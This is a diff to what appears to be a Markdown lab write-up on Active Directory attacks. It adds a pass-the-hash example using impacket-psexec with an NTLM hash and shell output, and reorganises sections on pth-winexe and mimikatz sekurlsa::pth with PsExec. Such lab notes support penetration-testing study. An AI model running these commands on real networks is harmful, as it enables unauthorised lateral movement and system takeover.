@@ -407,12 +407,31 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 *Evil-WinRM* PS C:\Users\domainadmin\Documents>
 ```
 
-## 3.2. Using  pth-winexe
+## 3.2. Using impacket-psexec
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 domainadmin@192.168.17.12 cmd
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.17.12.....
+[*] Found writable share ADMIN$
+[*] Uploading file HwVcVIgn.exe
+[*] Opening SVCManager on 192.168.17.12.....
+[*] Creating service Dwks on 192.168.17.12.....
+[*] Starting service Dwks.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1129]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+<details>
+  <summary><h2>3.3. Using  pth-winexe</h2></summary>
 
 - LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command
 - **Requires SMB1** to be enabled on target, otherwise `ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET`
 
-### Domain account
+### 3.3.1. Domain account
 
 ```console
 ┌──(root㉿kali)-[~]
@@ -431,7 +450,7 @@ hostname
 SVR
 ```
 
-### Local account
+### 3.3.2. Local account
 
 ```console
 ┌──(root㉿kali)-[~]
@@ -450,9 +469,12 @@ hostname
 SVR
 ```
 
-## 3.3. Using mimikatz - sekurlsa::pth + PsExec
+</details>
 
-### 3.3.1. Domain account
+<details>
+  <summary><h2>3.4. Using mimikatz - sekurlsa::pth + PsExec</h2></summary>
+
+### 3.4.1. Domain account
 
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
@@ -496,7 +518,7 @@ C:\Windows\system32>hostname
 DC
 ```
 
-### 3.3.2. Local account
+### 3.4.2. Local account
 
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option
 
@@ -539,6 +561,8 @@ svr\administrator
 C:\Windows\system32>hostname
 SVR
 ```
+
+</details>
 
 # 4. Service Account Attack (Kerberoasting)
 
